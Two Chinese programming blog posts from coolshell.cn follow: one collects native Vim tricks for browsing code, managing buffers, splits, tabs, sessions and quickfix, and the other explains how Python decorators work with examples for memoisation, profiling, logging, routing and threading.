#####  [2014年03月24日 ](https://coolshell.cn/articles/11312.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [127 条评论](https://coolshell.cn/articles/11312.html#comments) 222,662 人阅读

![img](photo/success_vim.jpg)相信大家看过《[简明Vim教程](https://coolshell.cn/articles/5426.html)》也玩了《[Vim大冒险](https://coolshell.cn/articles/7166.html)》的游戏了，相信大家对Vim都有一个好的入门了。我在这里把我日常用Vim编程的一些技巧列出来给大家看看，希望对大家有用，另外，也是一个抛砖引玉的过程，也希望大家把你们的技巧跟贴一下，我会更新到这篇文章中。另外，这篇文章里的这些技巧全都是vim原生态的，不需要你安装什么插件。**我的Vim的版本是7.2**。

目录



[浏览代码](https://coolshell.cn/articles/11312.html#浏览代码)[缓冲区](https://coolshell.cn/articles/11312.html#缓冲区)[窗口分屏浏览](https://coolshell.cn/articles/11312.html#窗口分屏浏览)[分屏同步移动](https://coolshell.cn/articles/11312.html#分屏同步移动)[Tab页浏览目录](https://coolshell.cn/articles/11312.html#Tab页浏览目录)[保存会话](https://coolshell.cn/articles/11312.html#保存会话)[Quickfix](https://coolshell.cn/articles/11312.html#Quickfix)[关键字补全](https://coolshell.cn/articles/11312.html#关键字补全)[其它技巧](https://coolshell.cn/articles/11312.html#其它技巧)[字符相关](https://coolshell.cn/articles/11312.html#字符相关)[缩进相关](https://coolshell.cn/articles/11312.html#缩进相关)[复制粘贴相关](https://coolshell.cn/articles/11312.html#复制粘贴相关)[光标移动相关](https://coolshell.cn/articles/11312.html#光标移动相关)[读取Shell命令相关](https://coolshell.cn/articles/11312.html#读取Shell命令相关)[vim的终级插件](https://coolshell.cn/articles/11312.html#vim的终级插件)

#### 浏览代码

首先，我们先从浏览代码开始。有时候，我们需要看多个文件，所以，传统的做法是，我们开多个tty终端，每个tty里用Vim打开一个文件，然后来回切换。这很没有什么效率。我们希望在一个Vim里打开多个文件，甚至浏览程序目录。

浏览目录的命令很简单：（你也可以直接vim一个目录）

> **:E**

注意，是大写。于是，你会看到下面这样的界面：



![img](photo/Explorer.png)

这个界面中，**你可以用 j, k 键上下移动，然后回车，进入一个目录，或是找开一个文件**。你可以看到上面有一堆命令：

- 【 – 】 到上级目录
- 【D】删除文件（大写）
- 【R】改文件名（大写）
- 【s】对文件排序（小写）
- 【x】执行文件

当然，打开的文件会把现有已打开的文件给冲掉——也就是说你只看到了一个文件。

如果你要改变当前浏览的目录，或是查看当前浏览的目录，你可以使用和shell一样的命令：

> **:cd <dir> – 改变当前目录**
>
> **:pwd  – 查看当前目录**

#### 缓冲区

其实，你用:E 浏览打开的文件都没有被关闭，这些文件都在缓冲区中。你可以用下面的命令来查看缓冲区：

> **:ls**

于是，在你的Vim下，你会看到如下界面：

![img](photo/buffer_ls.png)

你可以看到Vim打开了四个文件，编号是4，5，6，7，如果你要切换打开的文件，这个时候，你不要按回车（按了也没事，只不过按了就看不到:ls输出的buffer列表了），你可以使用下面的命令切换文件（buffer后面的4表示切到4号文件也就是src/http/ngx_http.c）：

> **:buffer 4**

或是：

> **:buffer src/http/ngx_http.c**

注意，

- 你可以像在Shell中输入命令按Tab键补全一样补全Vim的命令。
- 也可以用像gdb一样用最前面的几个字符，只要没有冲突。如：buff

你还可以动用如下命令，快速切换：

> :bnext    缩写 :bn
> :bprevious  缩写 :bp
> :blast  缩写 :bl
> :bfirst 缩写 :bf

上图中，我们还可以看到5有一个%a，这表示当前文件，相关的标记如下：

– （非活动的缓冲区）
a （当前被激活缓冲区）
h （隐藏的缓冲区）
% （当前的缓冲区）
\# （交换缓冲区）
= （只读缓冲区）
\+ （已经更改的缓冲区）

#### 窗口分屏浏览

相信你在《[Vim的窗口分屏](https://coolshell.cn/articles/1679.html)》一文中，你已经知道了怎么拆分窗口了。其实，我更多的不是用拆分窗口的命令，而是用浏览文件的命令来分隔窗口。如：

把当前窗口上下分屏，并在下面进行目录浏览：

> **:He  全称为 :Hexplore  （在下边分屏浏览目录）**

如果你要在上面，你就在 :He后面加个 !，

> **:He!  （在上分屏浏览目录）**

如果你要左右分屏的话，你可以这样：

> **:Ve 全称为 :Vexplore （在左边分屏间浏览目录，要在右边则是 :Ve!）**

下图是分别用:He 和 :Ve搞出来的同时看三个文件：

![img](photo/WindowsExplorer.png)

在分屏间的跳转和切换在《[Vim的窗口分屏](https://coolshell.cn/articles/1679.html)》一文中提过了：**先按Ctrl + W，然后按方向键：h j k l**

#### 分屏同步移动

要让两个分屏中的文件同步移动，很简单，你需要到需要同步移动的两个屏中都输入如下命令（相当于使用“铁锁连环”）：

> **:set scb**

如果你需要解开，那么就输入下面的命令：

> **:set scb!**

注：set scb 是 set scrollbind 的简写。

#### Tab页浏览目录

分屏可能会让你不爽，你可能更喜欢像Chrome这样的分页式的浏览，那么你可以用下面的命令：

> **:Te  全称是 :Texplorer**

下图中，你可以看到我用Te命令打开了三页，就在顶端我们可以可以看到有三页，其中第一页Tab上的数字3表示那一页有3个文件。

![img](photo/TabExplorer.png)

我们要在多个Tabe页中切换，在normal模式下，你可以使用下面三个按键（注意没有冒号）：

> **gt  – 到下一个页**
>
> **gT  – 到前一个页**
>
> **{i} gt  – i是数字，到指定页，比如：5 gt 就是到第5页**

你可以以使用 【:tabm {n}】来切换Tab页。

gvim应该是：Ctrl+PgDn 和 Ctrl+PgUp 来在各个页中切换。

如果你想看看你现在打开的窗口和Tab的情况，你可以使用下面的命令：

> **:tabs**

于是你可以看到：

![img](photo/Tab01.png)

使用如下命令可以关闭tab：（当然，我更喜欢使用传统的:q, :wq来关闭）

> **:tabclose [i]** – 如果后面指定了数字，那就关闭指定页，如果没有就关闭当前页

最后提一下，如果你在Shell命令行下，你可以使用 vim 的 -p 参数来用Tab页的方式打开多个文件，比如：

> **vim -p cool.cpp shell.cpp haoel.cpp
> vim -p \*.cpp**

**注：如果你想把buffer中的文件全转成tab的话，你可以使用下面的命令**

> **:bufdo tab split**

#### 保存会话

如果你用Tab或Window打开了好些文件的文件，还设置了各种滚屏同步，或是行号……，那么，你可以用下面的命令来保存会话：（你有兴趣你可以看看你的 mysession.vim文件内容，也就是一个批处理文件）

> **:mksession ~/.mysession.vim**

如果文件重复，vim默认会报错，如果你想强行写入的话，你可以在mksession后加! ：

> **:mksession! ~/.mysession.vim**

于是下次，你可以这样打开这个会话：

> **vim -S ~/.mysession.vim**

保存完会话后，你也没有必要一个一个Tab/Windows的去Close。你可以简单地使用：

> **:qa  – 退出全部** 
>
> **:wqa  -保存全部并退出全部**

#### Quickfix

假如我们有一个hello.cpp文件和一个makefile，于是我们可以直接在vim下输入 :make ， 于是就可以make这个hello.cpp文件，如果出错了，我们需要按回车返回，这个时候，我们可以使用下面的命令来把出错显到在vim的分屏中：

> **:cw**

于是，就会出现下面右边的那个样子：（是不是看上去和我一样很帅？）

![img](photo/quickfix.png)

上图中左边是我的makefile，右边是我的错误百出的源代码，右边下面是quickfix窗屏。你可以看到quickfix窗屏指向的第一个错误已经定位到我们相就错误的文件行上了。

你可以使用像浏览文件那样用j, k在quckfix窗屏中上下移动到相应的错误上然后按回车，然后就可以在上面的窗屏里定位到相应的源文件的代码行。但是，如果是这样的话， 你要定位下一条错误还得用Ctrl +W 回到quickfix屏中来然后重复来过。

你可以使用下面的命令而不用回到quickfix中来：

> **:cp 跳到上一个错误**
>
> **:cn 跳到下一个错误**
>
> **:cl 列出所有错误**
>
> **:cc 显示错误详细信息**

下面我们来看另一个quickfix的功能。

如果你用过vim的cscope插件，你就知道cscope可以用来查找相当的代码，但cscope需要事先生成一个数据库，对一些简单的查找，其实，我们用vim的grep命令就可以了，不需要专门为之生成数据库。vim的grep命令和shell的几乎一样。

我们来看个例子：

比如我们正在浏览nginx的代码，这时，我想看看哪里用到了nginx的NGX_HTTP_VAR_INDEXED宏。于是，我可以在vim里输入如下的命令：

> **:grep -r –include=”\*.[ch]” NGX_HTTP_VAR_INDEXED src/**

上面这个命令意思是递归查询src目录下所有的.c和.h文件，其中包括NGX_HTTP_VAR_INDEXED宏。然后，你就会看到vim到shell里去执行并找到了相关的文件，按回车返回vim后，别忘了用 【:cw 】把grep的输出取回来，于是我们就有下面的样子：

![img](photo/quickfix_grep.png)

然后同上面一样，你可以用 j，k 键移动quickfix里的光标到相应的行，然后按回车定位文件，或是使用【:cn】或【:cp】来移动到定位。（这样，你会把多个文件打开到缓冲区，别忘了【:ls】来查看缓冲区）

你看，到这里，一个小小的IDE就这样产生了，而且，**最帅的时，我们连一点插件都没有装，也没有在.vimrc文件中配置过什么**。

#### 关键字补全

我们还是坚持不用任何插件。我们来看看是怎么个自动补全的。

在insert模式下，我们可以按如下快捷键：

> 【**Ctrl +N**】  – 当你按下这它时，你会发现Vim就开始搜索你这个目录下的代码，搜索完成了就会出现一个下拉列表（居然是粉紫色的，真是丑死了）

下图是我输入了ngx_http_然后按ctrl+n出现的样子，它已经帮我补全了一个，但是我不想要这个。然后，在Vim的下方我们可以看到状态变成了“关键字补全”，然后后面有^N^P的提示，意思就是告诉你还有一个Ctrl+P.

![img](photo/auto_complete_ctrl_n.png)

> 【**Ctrl + P**】 – 接下来你可以按这个键，于是回到原点，然后你可以按上下光标键来选择相应的Word。

对于上面那个例子，我们按下了Ctrl+P后出现下面的这个样子。我们可以看到，光标回到了一开始我输入的位置，然后你可以干两件事，一个是继续输入（这可以帮助过滤关键词），另一个是用“光标键”上移或下移来选择下拉列表中的关键字，选好后回车，就补全了。

![img](photo/auto_complete_ctrl_p.png)

与此类似的，还有更多的补齐，都在Ctrl +X下面：

- Ctrl + X 和 Ctrl + D 宏定义补齐
- Ctrl + X 和 Ctrl + ] 是Tag 补齐
- Ctrl + X 和 Ctrl + F 是文件名 补齐
- Ctrl + X 和 Ctrl + I 也是关键词补齐，但是关键后会有个文件名，告诉你这个关键词在哪个文件中
- Ctrl + X 和 Ctrl +V 是表达式补齐
- Ctrl + X 和 Ctrl +L 这可以对整个行补齐，变态吧。

#### 其它技巧

##### 字符相关

【guu 】 – 把一行的文字变成全小写。或是【Vu】

【gUU】 – 把一行的文件变成全大写。或是【VU】

按【v】键进入选择模式，然后移动光标选择你要的文本，按【u】转小写，按【U】转大写

【ga】 –  查看光标处字符的ascii码

【g8】 – 查看光标处字符的utf-8编码

【gf】  – 打开光标处所指的文件 （这个命令在打到#include头文件时挺好用的，当然，仅限于有路径的）

【*】或【#】在当前文件中搜索当前光标的单词

##### 缩进相关

【>>】向右给它进当前行 【<<】向左缩进当前行

【=】  – 缩进当前行 （和上面不一样的是，它会对齐缩进）

【=%】 – 把光标位置移到语句块的括号上，然后按=%，缩进整个语句块（%是括号匹配）

【G=gg】 或是 【gg=G】  – 缩进整个文件（G是到文件结尾，gg是到文件开头）

##### 复制粘贴相关

按【v】 键进入选择模式，然后按h,j,k,l移动光标，选择文本，然后按 【y】 进行复制，按 【p】 进行粘贴。

【dd】剪切一行（前面加个数字可以剪切n行），【p】粘贴

【yy】复制一行（前面加个数字可以复制n行），【p】粘贴

##### 光标移动相关

【Ctrl + O】向后回退你的光标移动

【Ctrl + I 】向前追赶你的光标移动

这两个快捷键很有用，可以在Tab页和Windows中向前和向后trace你的光标键，这也方便你跳转光标。

##### 读取Shell命令相关

【:r!date】 插入日期

上面这个命令，:r 是:read的缩写，!是表明要运行一个shell命令，意思是我要把shell命令的输出读到vim里来。

#### vim的终级插件

CentOS下：yum erase emacs

Ubuntu下：apt-get remove emacs

对了，以前本站也有一篇小短文《[如何在vim中得到你最喜爱的IDE特性](https://coolshell.cn/articles/894.html)》你也可以看看。

（:wq）

# PYTHON修饰器的函数式编程

#####  [2014年03月20日 ](https://coolshell.cn/articles/11265.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [84 条评论](https://coolshell.cn/articles/11265.html#comments) 124,824 人阅读

![img](photo/snake-hat-new-year-schedule-800x960.jpg)Python的修饰器的英文名叫Decorator，当你看到这个英文名的时候，你可能会把其跟Design Pattern里的Decorator搞混了，其实这是完全不同的两个东西。虽然好像，他们要干的事都很相似——都是想要对一个已有的模块做一些“修饰工作”，所谓修饰工作就是想给现有的模块加上一些小装饰（一些小功能，这些小功能可能好多模块都会用到），但又不让这个小装饰（小功能）侵入到原有的模块中的代码里去。但是OO的Decorator简直就是一场恶梦，不信你就去看看wikipedia上的词条（[Decorator Pattern](https://en.wikipedia.org/wiki/Decorator_pattern)）里的UML图和那些代码，这就是我在《 [从面向对象的设计模式看软件设计](https://coolshell.cn/articles/8961.html)》“餐后甜点”一节中说的，OO鼓励了——“厚重地胶合和复杂层次”，也是《 [如此理解面向对象编程](https://coolshell.cn/articles/8745.html)》中所说的“OO的狂热者们非常害怕处理数据”，Decorator Pattern搞出来的代码简直就是OO的反面教程。

Python 的 Decorator在使用上和Java/C#的Annotation很相似，就是在方法名前面加一个@XXX注解来为这个方法装饰一些东西。但是，Java/C#的Annotation也很让人望而却步，太TMD的复杂了，你要玩它，你需要了解一堆Annotation的类库文档，让人感觉就是在学另外一门语言。

而Python使用了一种相对于Decorator Pattern和Annotation来说非常优雅的方法，这种方法不需要你去掌握什么复杂的OO模型或是Annotation的各种类库规定，完全就是语言层面的玩法：一种函数式编程的技巧。如果你看过本站的《[函数式编程](https://coolshell.cn/articles/10822.html)》，你一定会为函数式编程的那种“描述你想干什么，而不是描述你要怎么去实现”的编程方式感到畅快。（如果你不了解函数式编程，那在读本文之前，还请你移步去看看《[函数式编程](https://coolshell.cn/articles/10822.html)》） 好了，我们先来点感性认识，看一个Python修饰器的Hello World的代码。



目录



[Hello World](https://coolshell.cn/articles/11265.html#Hello_World)[Decorator 的本质](https://coolshell.cn/articles/11265.html#Decorator_的本质)[带参数及多个Decrorator](https://coolshell.cn/articles/11265.html#带参数及多个Decrorator)[class式的 Decorator](https://coolshell.cn/articles/11265.html#class式的_Decorator)[用Decorator设置函数的调用参数](https://coolshell.cn/articles/11265.html#用Decorator设置函数的调用参数)[Decorator的副作用](https://coolshell.cn/articles/11265.html#Decorator的副作用)[一些decorator的示例](https://coolshell.cn/articles/11265.html#一些decorator的示例)[给函数调用做缓存](https://coolshell.cn/articles/11265.html#给函数调用做缓存)[Profiler的例子](https://coolshell.cn/articles/11265.html#Profiler的例子)[注册回调函数](https://coolshell.cn/articles/11265.html#注册回调函数)[给函数打日志](https://coolshell.cn/articles/11265.html#给函数打日志)[一个MySQL的Decorator](https://coolshell.cn/articles/11265.html#一个MySQL的Decorator)[线程异步](https://coolshell.cn/articles/11265.html#线程异步)[其它](https://coolshell.cn/articles/11265.html#其它)

#### Hello World

下面是代码（文件名：hello.py）：

def hello(fn):

​    def wrapper():

​        print "hello, %s" % fn.__name__

​        fn()

​        print "goodby, %s" % fn.__name__

​    **return** wrapper

@hello

def foo():

​    print "i am foo"

foo()

当你运行代码，你会看到如下输出：

[chenaho@chenhao-air]$ python hello.py

hello, foo

i am foo

goodby, foo

你可以看到如下的东西：

1）函数foo前面有个@hello的“注解”，hello就是我们前面定义的函数hello

2）在hello函数中，其需要一个fn的参数（这就用来做回调的函数）

3）hello函数中返回了一个inner函数wrapper，这个wrapper函数回调了传进来的fn，并在回调前后加了两条语句。

#### Decorator 的本质

对于Python的这个@注解语法糖- Syntactic Sugar 来说，当你在用某个@decorator来修饰某个函数func时，如下所示:

@decorator

**def** func():

​    **pass**

其解释器会解释成下面这样的语句：

func = decorator(func)

尼玛，这不就是把一个函数当参数传到另一个函数中，然后再回调吗？是的，但是，我们需要注意，那里还有一个赋值语句，把decorator这个函数的返回值赋值回了原来的func。 根据《[函数式编程](https://coolshell.cn/articles/10822.html)》中的**first class functions**中的定义的，你可以把函数当成变量来使用，所以，decorator必需得返回了一个函数出来给func，这就是所谓的**higher order function** 高阶函数，不然，后面当func()调用的时候就会出错。 就我们上面那个hello.py里的例子来说，

@hello

**def** foo():

​    print "i am foo"

被解释成了：

 foo = hello(foo)

**是的，这是一条语句，而且还被执行了。**你如果不信的话，你可以写这样的程序来试试看：

**def** fuck(fn):

​    print "fuck %s!" % fn.__name__[::-1].upper()

@fuck

**def** wfg():

​    **pass**

没了，就上面这段代码，没有调用wfg()的语句，你会发现， fuck函数被调用了，而且还很NB地输出了我们每个人的心声！

再回到我们hello.py的那个例子，我们可以看到，**hello(foo)返回了wrapper()函数，所以，foo其实变成了wrapper的一个变量，而后面的foo()执行其实变成了wrapper()**。

知道这点本质，当你看到有多个decorator或是带参数的decorator，你也就不会害怕了。

比如：多个decorator

@decorator_one

@decorator_two

**def** func():

​    **pass**

相当于：

func = decorator_one(decorator_two(func))

比如：带参数的decorator：

@decorator(arg1, arg2)

**def** func():

​    **pass**

相当于：

func = decorator(arg1,arg2)(func)

这意味着decorator(arg1, arg2)这个函数需要返回一个“真正的decorator”。

#### 带参数及多个Decrorator

我们来看一个有点意义的例子（文件名：html.py）：

在上面这个例子中，我们可以看到：makeHtmlTag有两个参数。所以，**为了让 hello = makeHtmlTag(arg1, arg2)(hello) 成功，makeHtmlTag 必需返回一个decorator**（这就是为什么我们在makeHtmlTag中加入了real_decorator()的原因）**，这样一来，我们就可以进入到 decorator 的逻辑中去了**—— decorator得返回一个wrapper，wrapper里回调hello。**看似那个makeHtmlTag() 写得层层叠叠，但是，已经了解了本质的我们觉得写得很自然**。 你看，Python的Decorator就是这么简单，没有什么复杂的东西，你也不需要了解过多的东西，使用起来就是那么自然、体贴、干爽、透气，独有的速效凹道和完美的吸收轨迹，让你再也不用为每个月的那几天感到焦虑和不安，再加上贴心的护翼设计，量多也不用当心。对不起，我调皮了。 什么，你觉得上面那个带参数的Decorator的函数嵌套太多了，你受不了。好吧，没事，我们看看下面的方法。

#### class式的 Decorator

首先，先得说一下，decorator的class方式，还是看个示例：

**class** myDecorator(object):

​    **def** __init__(self, fn):

​        print "inside myDecorator.__init__()"

​        self.fn = fn

​    **def** __call__(self):

​        self.fn()

​        print "inside myDecorator.__call__()"

@myDecorator

**def** aFunction():

​    print "inside aFunction()"

print "Finished decorating aFunction()"

aFunction()

\# 输出：

\# inside myDecorator.__init__()

\# Finished decorating aFunction()

\# inside aFunction()

\# inside myDecorator.__call__()

上面这个示例展示了，用类的方式声明一个decorator。我们可以看到这个类中有两个成员：
1）一个是**init**()，这个方法是在我们给某个函数decorator时被调用，所以，需要有一个fn的参数，也就是被decorator的函数。
2）一个是**call**()，这个方法是在我们调用被decorator函数时被调用的。
上面输出可以看到整个程序的执行顺序。

这看上去要比“函数式”的方式更易读一些。

下面，我们来看看用类的方式来重写上面的html.py的代码（文件名：html.py）：

**class** makeHtmlTagClass(object):

​    **def** __init__(self, tag, css_class=""):

​        self._tag = tag

​        self._css_class = " class='{0}'".format(css_class) \

​                                       **if** css_class !="" **else** ""

​    **def** __call__(self, fn):

​        **def** wrapped(*args, **kwargs):

​            **return** "<" + self._tag + self._css_class+">"  \

​                       \+ fn(*args, **kwargs) + "</" + self._tag + ">"

​        **return** wrapped

@makeHtmlTagClass(tag="b", css_class="bold_css")

@makeHtmlTagClass(tag="i", css_class="italic_css")

**def** hello(name):

​    **return** "Hello, {}".format(name)

print hello("Hao Chen")

上面这段代码中，我们需要注意这几点：
1）如果decorator有参数的话，**init**() 成员就不能传入fn了，而fn是在**call**的时候传入的。
2）这段代码还展示了 wrapped(*args, **kwargs) 这种方式来传递被decorator函数的参数。（其中：args是一个参数列表，kwargs是参数dict，具体的细节，请参考Python的文档或是[StackOverflow的这个问题](http://stackoverflow.com/questions/3394835/args-and-kwargs)，这里就不展开了）

#### 用Decorator设置函数的调用参数

你有三种方法可以干这个事：

第一种，通过 **kwargs，这种方法decorator会在kwargs中注入参数。

**def** decorate_A(function):

​    **def** wrap_function(*args, **kwargs):

​        kwargs['str'] = 'Hello!'

​        **return** function(*args, **kwargs)

​    **return** wrap_function

@decorate_A

**def** print_message_A(*args, **kwargs):

​    print(kwargs['str'])

print_message_A()

第二种，约定好参数，直接修改参数

**def** decorate_B(function):

​    **def** wrap_function(*args, **kwargs):

​        str = 'Hello!'

​        **return** function(str, *args, **kwargs)

​    **return** wrap_function

@decorate_B

**def** print_message_B(str, *args, **kwargs):

​    print(str)

print_message_B()

第三种，通过 *args 注入

**def** decorate_C(function):

​    **def** wrap_function(*args, **kwargs):

​        str = 'Hello!'

​        \#args.insert(1, str)

​        args = args +(str,)

​        **return** function(*args, **kwargs)

​    **return** wrap_function

**class** Printer:

​    @decorate_C

​    **def** print_message(self, str, *args, **kwargs):

​        print(str)

p = Printer()

p.print_message()

#### Decorator的副作用

到这里，我相信你应该了解了整个Python的decorator的原理了。

相信你也会发现，被decorator的函数其实已经是另外一个函数了，对于最前面那个hello.py的例子来说，如果你查询一下foo.**name**的话，你会发现其输出的是“wrapper”，而不是我们期望的“foo”，这会给我们的程序埋一些坑。所以，Python的functool包中提供了一个叫wrap的decorator来消除这样的副作用。下面是我们新版本的 hello.py。

**from** functools **import** wraps

**def** hello(fn):

​    @wraps(fn)

​    **def** wrapper():

​        print "hello, %s" % fn.__name__

​        fn()

​        print "goodby, %s" % fn.__name__

​    **return** wrapper

@hello

**def** foo():

​    *'''foo help doc'''*

​    print "i am foo"

​    **pass**

foo()

print foo.__name__ #输出 foo

print foo.__doc__  #输出 foo help doc

当然，即使是你用了functools的wraps，也不能完全消除这样的副作用。

来看下面这个示例：

**from** inspect **import** getmembers, getargspec

**from** *functools* **import** wraps

**def** wraps_decorator(f):

​    @wraps(f)

​    **def** wraps_wrapper(*args, **kwargs):

​        **return** f(*args, **kwargs)

​    **return** wraps_wrapper

**class** SomeClass(object):

​    @wraps_decorator

​    **def** method(self, x, y):

​        **pass**

obj = SomeClass()

**for** name, func **in** getmembers(obj, predicate=inspect.ismethod):

​    print "Member Name: %s" % name

​    print "Func Name: %s" % func.func_name

​    print "Args: %s" % getargspec(func)[0]

\# 输出：

\# Member Name: method

\# Func Name: method

\# Args: []

你会发现，即使是你你用了functools的wraps，你在用getargspec时，参数也不见了。

要修正这一问，我们还得用Python的反射来解决，下面是相关的代码：

**def** get_true_argspec(method):

​    argspec = inspect.getargspec(method)

​    args = argspec[0]

​    **if** args and args[0] == 'self':

​        **return** argspec

​    **if** hasattr(method, '__func__'):

​        method = method.__func__

​    **if** not hasattr(method, 'func_closure') or method.func_closure **is** **None**:

​        **raise** Exception("No closure for method.")

​    method = method.func_closure[0].cell_contents

​    **return** get_true_argspec(method)

当然，我相信大多数人的程序都不会去getargspec。所以，用functools的wraps应该够用了。

#### 一些decorator的示例

好了，现在我们来看一下各种decorator的例子：

##### 给函数调用做缓存

这个例实在是太经典了，整个网上都用这个例子做decorator的经典范例，因为太经典了，所以，我这篇文章也不能免俗。

**from** functools **import** wraps

**def** memo(fn):

​    cache = {}

​    miss = object()

​    @wraps(fn)

​    **def** wrapper(*args):

​        result = cache.get(args, miss)

​        **if** result **is** miss:

​            result = fn(*args)

​            cache[args] = result

​        **return** result

​    **return** wrapper

@memo

**def** fib(n):

​    **if** n < 2:

​        **return** n

​    **return** fib(n - 1) + fib(n - 2)

上面这个例子中，是一个斐波拉契数例的递归算法。我们知道，这个递归是相当没有效率的，因为会重复调用。比如：我们要计算fib(5)，于是其分解成fib(4) + fib(3)，而fib(4)分解成fib(3)+fib(2)，fib(3)又分解成fib(2)+fib(1)…… 你可看到，基本上来说，fib(3), fib(2), fib(1)在整个递归过程中被调用了两次。

而我们用decorator，在调用函数前查询一下缓存，如果没有才调用了，有了就从缓存中返回值。一下子，这个递归从二叉树式的递归成了线性的递归。

##### Profiler的例子

这个例子没什么高深的，就是实用一些。

**import** cProfile, pstats, StringIO

**def** profiler(func):

​    **def** wrapper(*args, **kwargs):

​        datafn = func.__name__ + ".profile" # Name the data file

​        prof = cProfile.Profile()

​        retval = prof.runcall(func, *args, **kwargs)

​        \#prof.dump_stats(datafn)

​        s = StringIO.StringIO()

​        sortby = 'cumulative'

​        ps = pstats.Stats(prof, stream=s).sort_stats(sortby)

​        ps.print_stats()

​        print s.getvalue()

​        **return** retval

​    **return** wrapper

##### 注册回调函数

下面这个示例展示了通过URL的路由来调用相关注册的函数示例：

**class** MyApp():

​    **def** __init__(self):

​        self.func_map = {}

​    **def** register(self, name):

​        **def** func_wrapper(func):

​            self.func_map[name] = func

​            **return** func

​        **return** func_wrapper

​    **def** call_method(self, name=**None**):

​        func = self.func_map.get(name, **None**)

​        **if** func **is** **None**:

​            **raise** Exception("No function registered against - " + str(name))

​        **return** func()

app = MyApp()

@app.register('/')

**def** main_page_func():

​    **return** "This is the main page."

@app.register('/next_page')

**def** next_page_func():

​    **return** "This is the next page."

print app.call_method('/')

print app.call_method('/next_page')

注意：
1）上面这个示例中，用类的实例来做decorator。
2）decorator类中没有**call**()，但是wrapper返回了原函数。所以，原函数没有发生任何变化。

##### 给函数打日志

下面这个示例演示了一个logger的decorator，这个decorator输出了函数名，参数，返回值，和运行时间。

**from** functools **import** wraps

**def** logger(fn):

​    @wraps(fn)

​    **def** wrapper(*args, **kwargs):

​        ts = time.time()

​        result = fn(*args, **kwargs)

​        te = time.time()

​        print "function      = {0}".format(fn.__name__)

​        print "    arguments = {0} {1}".format(args, kwargs)

​        print "    return    = {0}".format(result)

​        print "    time      = %.6f sec" % (te-ts)

​        **return** result

​    **return** wrapper

@logger

**def** multipy(x, y):

​    **return** x * y

@logger

**def** sum_num(n):

​    s = 0

​    **for** i **in** xrange(n+1):

​        s += i

​    **return** s

print multipy(2, 10)

print sum_num(100)

print sum_num(10000000)

上面那个打日志还是有点粗糙，让我们看一个更好一点的（带log level参数的）：

**import** inspect

**def** get_line_number():

​    **return** inspect.currentframe().f_back.f_back.f_lineno

**def** logger(loglevel):

​    **def** log_decorator(fn):

​        @wraps(fn)

​        **def** wrapper(*args, **kwargs):

​            ts = time.time()

​            result = fn(*args, **kwargs)

​            te = time.time()

​            print "function   = " + fn.__name__,

​            print "    arguments = {0} {1}".format(args, kwargs)

​            print "    return    = {0}".format(result)

​            print "    time      = %.6f sec" % (te-ts)

​            **if** (loglevel == 'debug'):

​                print "    called_from_line : " + str(get_line_number())

​            **return** result

​        **return** wrapper

​    **return** log_decorator

但是，上面这个带log level参数的有两具不好的地方，
1） loglevel不是debug的时候，还是要计算函数调用的时间。
2） 不同level的要写在一起，不易读。

我们再接着改进：

**import** inspect

**def** advance_logger(loglevel):

​    **def** get_line_number():

​        **return** inspect.currentframe().f_back.f_back.f_lineno

​    **def** _basic_log(fn, result, *args, **kwargs):

​        print "function   = " + fn.__name__,

​        print "    arguments = {0} {1}".format(args, kwargs)

​        print "    return    = {0}".format(result)

​    **def** info_log_decorator(fn):

​        @wraps(fn)

​        **def** wrapper(*args, **kwargs):

​            result = fn(*args, **kwargs)

​            _basic_log(fn, result, args, kwargs)

​        **return** wrapper

​    **def** debug_log_decorator(fn):

​        @wraps(fn)

​        **def** wrapper(*args, **kwargs):

​            ts = time.time()

​            result = fn(*args, **kwargs)

​            te = time.time()

​            _basic_log(fn, result, args, kwargs)

​            print "    time      = %.6f sec" % (te-ts)

​            print "    called_from_line : " + str(get_line_number())

​        **return** wrapper

​    **if** loglevel **is** "debug":

​        **return** debug_log_decorator

​    **else**:

​        **return** info_log_decorator

你可以看到两点，
1）我们分了两个log level，一个是info的，一个是debug的，然后我们在外尾根据不同的参数返回不同的decorator。
2）我们把info和debug中的相同的代码抽到了一个叫_basic_log的函数里，DRY原则。

##### 一个MySQL的Decorator

下面这个decorator是我在工作中用到的代码，我简化了一下，把DB连接池的代码去掉了，这样能简单点，方便阅读。

**import** umysql

**from** *functools* **import** wraps

**class** Configuraion:

​    **def** __init__(self, env):

​        **if** env == "Prod":

​            self.host    = "coolshell.cn"

​            self.port    = 3306

​            self.db      = "coolshell"

​            self.user    = "coolshell"

​            self.passwd  = "fuckgfw"

​        **elif** env == "Test":

​            self.host   = 'localhost'

​            self.port   = 3300

​            self.user   = 'coolshell'

​            self.db     = 'coolshell'

​            self.passwd = 'fuckgfw'

**def** mysql(sql):

​    _conf = Configuraion(env="Prod")

​    **def** on_sql_error(err):

​        print err

​        sys.exit(-1)

​    **def** handle_sql_result(rs):

​        **if** rs.rows > 0:

​            fieldnames = [f[0] **for** f **in** rs.fields]

​            **return** [dict(zip(fieldnames, r)) **for** r **in** rs.rows]

​        **else**:

​            **return** []

​    **def** decorator(fn):

​        @wraps(fn)

​        **def** wrapper(*args, **kwargs):

​            mysqlconn = umysql.Connection()

​            mysqlconn.settimeout(5)

​            mysqlconn.connect(_conf.host, _conf.port, _conf.user, \

​                              _conf.passwd, _conf.db, **True**, 'utf8')

​            **try**:

​                rs = mysqlconn.query(sql, {})

​            **except** umysql.Error **as** e:

​                on_sql_error(e)

​            data = handle_sql_result(rs)

​            kwargs["data"] = data

​            result = fn(*args, **kwargs)

​            mysqlconn.close()

​            **return** result

​        **return** wrapper

​    **return** decorator

@mysql(sql = "select * from coolshell" )

**def** get_coolshell(data):

​    ... ...

​    ... ..

##### 线程异步

下面量个非常简单的异步执行的decorator，注意，异步处理并不简单，下面只是一个示例。

**from** threading **import** Thread

**from** *functools* **import** wraps

**def** **async**(func):

​    @wraps(func)

​    **def** async_func(*args, **kwargs):

​        func_hl = Thread(target = func, args = args, kwargs = kwargs)

​        func_hl.start()

​        **return** func_hl

​    **return** async_func

**if** __name__ == '__main__':

​    **from** *time* **import** sleep

​    @**async**

​    **def** print_somedata():

​        print 'starting print_somedata'

​        sleep(2)

​        print 'print_somedata: 2 sec passed'

​        sleep(2)

​        print 'print_somedata: 2 sec passed'

​        sleep(2)

​        print 'finished print_somedata'

​    **def** main():

​        print_somedata()

​        print 'back in main'

​        print_somedata()

​        print 'back in main'

​    main()

#### 其它

关于更多的示例，你可以参看： [Python Decorator Library](https://wiki.python.org/moin/PythonDecoratorLibrary)

